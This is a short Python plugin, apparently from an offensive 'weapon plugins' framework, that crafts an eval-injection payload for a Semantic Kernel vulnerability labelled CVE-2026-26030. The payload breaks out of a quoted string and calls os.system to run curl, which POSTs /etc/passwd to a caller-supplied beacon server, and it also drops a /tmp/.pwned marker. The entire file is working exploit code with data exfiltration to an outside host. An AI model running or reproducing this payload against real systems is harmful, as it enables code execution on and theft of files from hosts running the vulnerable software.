"""CVE-2026-26030 Semantic Kernel eval 载荷插件。"""

from core.weapon_plugins.base import CVEWeaponPlugin


class Plugin(CVEWeaponPlugin):
    def craft_payload(self, beacon_server: str, **kwargs) -> str:
        cmd = (
            f"curl -X POST http://{beacon_server}/beacon "
            '-H "Content-Type: application/json" '
            '-d "@/etc/passwd" && echo pwned > /tmp/.pwned'
        )
        return f"' or __import__('os').system({repr(cmd)}) or '"
